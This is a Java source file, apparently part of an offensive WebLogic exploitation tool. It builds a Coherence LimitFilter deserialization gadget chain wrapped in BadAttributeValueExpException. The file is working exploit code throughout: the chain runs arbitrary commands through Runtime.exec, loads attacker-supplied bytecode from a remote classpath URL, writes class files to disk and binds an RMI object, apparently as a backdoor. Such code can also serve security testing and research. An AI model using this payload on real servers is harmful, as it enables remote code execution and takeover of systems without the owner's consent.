/*
 * Copyright (c) 2020. r4v3zn.
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.r4v3zn.weblogic.framework.gadget.impl;

import com.r4v3zn.weblogic.framework.annotation.Authors;
import com.r4v3zn.weblogic.framework.annotation.Dependencies;
import com.r4v3zn.weblogic.framework.entity.GadgetParam;
import com.r4v3zn.weblogic.framework.gadget.ObjectGadget;
import org.mozilla.classfile.DefiningClassLoader;
import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.net.URL;
import java.net.URLClassLoader;

import static org.apache.commons.lang3.StringUtils.isBlank;

/**
 * Title: LimitFilterGadget
 * Desc: LimitFilter Gadget
 * Gadget chain:
 *        ObjectInputStream.readObject()
 *            BadAttributeValueExpException.readObject()
 *                LimitFilter.toString()
 *                    ChainedExtractor.extract()
 *                            ReflectionExtractor.extract()
 *                                Method.invoke()
 *                                    Class.getMethod()
 *                            ReflectionExtractor.extract()
 *                                Method.invoke()
 *                                    Runtime.getRuntime()
 *                            ReflectionExtractor.extract()
 *                                Method.invoke()
 *                                    Runtime.exec()
 * Date:2020/3/29 1:31
 * @version 1.0.0
 */
@Authors({Authors.R4V3ZN})
@Dependencies({":weblogic:coherence", ":mozilla:javascript"})
public class LimitFilterGadget implements ObjectGadget<Serializable> {
    /**
     * 获取序列化 payload (Runtime)
     * @param command 执行的命令
     * @return 序列结果
     * @throws Exception
     */
    @Override
    public Serializable getObject(String command, URLClassLoader urlClassLoader) throws Exception {
        final String[] execArgs = new String[] { command };
        Class valueExtractorClazz = urlClassLoader.loadClass("com.tangosol.util.ValueExtractor");
        Class reflectionExtractorClazz = urlClassLoader.loadClass("com.tangosol.util.extractor.ReflectionExtractor");
        Object getMethod = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("getMethod",
                new Object[]{"getRuntime", new Class[0]});
        Object invoke = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("invoke",
                new Object[]{null, new Class[0]});
        Object exec = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("exec",
                new Object[]{execArgs});
        Object valueExtractor = Array.newInstance(valueExtractorClazz,3);
        Array.set(valueExtractor, 0, getMethod);
        Array.set(valueExtractor, 1, invoke);
        Array.set(valueExtractor, 2, exec);
        return getObject(valueExtractor, Runtime.class, urlClassLoader);
    }

    /**
     * 获取序列化 payload
     * @param codeByte 需要序列化的字节码
     * @param bootArgs 执行中参数,0位传入执行class命令,1位传入DefiningClassLoader url
     * @param className 反射的 class name
     * @return 序列结果
     * @throws Exception
     */
    @Override
    public Serializable getObject(byte[] codeByte, String[] bootArgs, String className, URLClassLoader urlClassLoader) throws Exception {
        String classPath = bootArgs[1];
        Class valueExtractorClazz = urlClassLoader.loadClass("com.tangosol.util.ValueExtractor");
        Class reflectionExtractorClazz = urlClassLoader.loadClass("com.tangosol.util.extractor.ReflectionExtractor");
        Class clazz = null;
        Object valueExtractor = Array.newInstance(valueExtractorClazz,4);
        if(isBlank(classPath)){
            Object javascriptNewInstance = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
            Object defineClass = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("defineClass",
                    new Object[]{className, codeByte});
            Object defineClassNewInstance  = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
            Object rmiBind = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("rmiBind",
                    new Object[]{bootArgs[0]});
            Array.set(valueExtractor, 0, javascriptNewInstance);
            Array.set(valueExtractor, 1, defineClass);
            Array.set(valueExtractor, 2, defineClassNewInstance);
            Array.set(valueExtractor, 3, rmiBind);
            clazz = DefiningClassLoader.class;
        }else{
            URL url = new URL(classPath);
            URL[] urls = new URL[]{url};
            valueExtractor = Array.newInstance(valueExtractorClazz,7);
            Object getConstructor = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("getConstructor",
                    new Object[]{new Class[]{URL[].class}});
            Object newInstance = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("newInstance",
                    new Object[]{new Object[]{urls}});
            Object loadClass = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("loadClass",
                    new Object[]{"org.mozilla.classfile.DefiningClassLoader"});
            Object javassistNewInstance  = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
            Object defineClass = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("defineClass",
                    new Object[]{className, codeByte});
            Object defineClassNewInstance  = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
            Object rmiBind = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("rmiBind",
                    new Object[]{bootArgs[0]});
            Array.set(valueExtractor, 0, getConstructor);
            Array.set(valueExtractor, 1, newInstance);
            Array.set(valueExtractor, 2, loadClass);
            Array.set(valueExtractor, 3, javassistNewInstance);
            Array.set(valueExtractor, 4, defineClass);
            Array.set(valueExtractor, 5, defineClassNewInstance);
            Array.set(valueExtractor, 6, rmiBind);
            clazz = URLClassLoader.class;
        }
        return getObject(valueExtractor, clazz, urlClassLoader);
    }

    @Override
    public Serializable getObject(GadgetParam param) throws Exception {
        String className = param.getClassName();
        URLClassLoader urlClassLoader = param.getUrlClassLoader();
        byte[] codeByte = param.getCodeByte();
        String[] bootArgs = param.getBootArgs();
        return getObject(codeByte, bootArgs, className, urlClassLoader);
    }

    /**
     * 文件写入
     *
     * @throws Exception
     * @param param
     */
    @Override
    public Serializable getWriteFileObject(GadgetParam param) throws Exception {
        byte[] codeByte = param.getCodeByte();
        String className = param.getClassName()+".class";
        URLClassLoader urlClassLoader = param.getUrlClassLoader();
        Class valueExtractorClazz = urlClassLoader.loadClass("com.tangosol.util.ValueExtractor");
        Class reflectionExtractorClazz = urlClassLoader.loadClass("com.tangosol.util.extractor.ReflectionExtractor");
        Class clazz = Class.class;
        Object valueExtractor = Array.newInstance(valueExtractorClazz,4);
        Object forName = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("forName",
                new Object[]{"java.io.FileOutputStream"});
        Object getConstructor = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("getConstructor",
                new Object[]{new Class[]{String.class}});
        Object newInstance = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("newInstance",
                new Object[]{new Object[]{className}});
        Object write = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("write",
                new Object[]{codeByte});
        Array.set(valueExtractor, 0, forName);
        Array.set(valueExtractor, 1, getConstructor);
        Array.set(valueExtractor, 2, newInstance);
        Array.set(valueExtractor, 3, write);
        return getObject(valueExtractor, clazz, urlClassLoader);
    }

    /**
     * 加载文件
     *
     * @throws Exception
     * @param param
     */
    @Override
    public Serializable getLoadFileObject(GadgetParam param) throws Exception {
        String className = param.getClassName();
        String[] bootArgs = param.getBootArgs();
        URLClassLoader urlClassLoader = param.getUrlClassLoader();
        Class valueExtractorClazz = urlClassLoader.loadClass("com.tangosol.util.ValueExtractor");
        Class reflectionExtractorClazz = urlClassLoader.loadClass("com.tangosol.util.extractor.ReflectionExtractor");
        Class clazz = URLClassLoader.class;
        Object valueExtractor = Array.newInstance(valueExtractorClazz,5);
        URL url = new URL("file:./");
        URL[] urls = new URL[]{url};
        Object getConstructor = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("getConstructor",
                new Object[]{new Class[]{URL[].class}});
        Object newInstance = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("newInstance",
                new Object[]{new Object[]{urls}});
        Object loadClass = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("loadClass",
                new Object[]{className});
        Object defineClassNewInstance  = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
        Object rmiBind = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("rmiBind",
                new Object[]{bootArgs[0]});
        Array.set(valueExtractor, 0, getConstructor);
        Array.set(valueExtractor, 1, newInstance);
        Array.set(valueExtractor, 2, loadClass);
        Array.set(valueExtractor, 3, defineClassNewInstance);
        Array.set(valueExtractor, 4, rmiBind);
        return getObject(valueExtractor, clazz, urlClassLoader);
//        return null;
    }

    /**
     * 获取序列化 payload
     * @param valueExtractors ValueExtractors
     * @param clazz 反序列化的 class
     * @return 序列结果
     * @throws Exception
     */
    private Serializable getObject(final Object valueExtractors, Class clazz, URLClassLoader urlClassLoader) throws Exception {
        Class limitFilterClazz = urlClassLoader.loadClass("com.tangosol.util.filter.LimitFilter");
        Class chainedExtractorClazz  = urlClassLoader.loadClass("com.tangosol.util.extractor.ChainedExtractor");
        Object limitFilter = limitFilterClazz.newInstance();
        Field m_comparator = limitFilterClazz.getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        Object chainedExtractor = chainedExtractorClazz.getConstructor(valueExtractors.getClass()).newInstance(valueExtractors);
        m_comparator.set(limitFilter, chainedExtractor);
        Field m_oAnchorTop = limitFilterClazz.getDeclaredField("m_oAnchorTop");
        m_oAnchorTop.setAccessible(true);
        m_oAnchorTop.set(limitFilter, clazz);
        BadAttributeValueExpException expException = new BadAttributeValueExpException(null);
        Field val = expException.getClass().getDeclaredField("val");
        val.setAccessible(true);
        val.set(expException, limitFilter);
        return expException;
    }
}
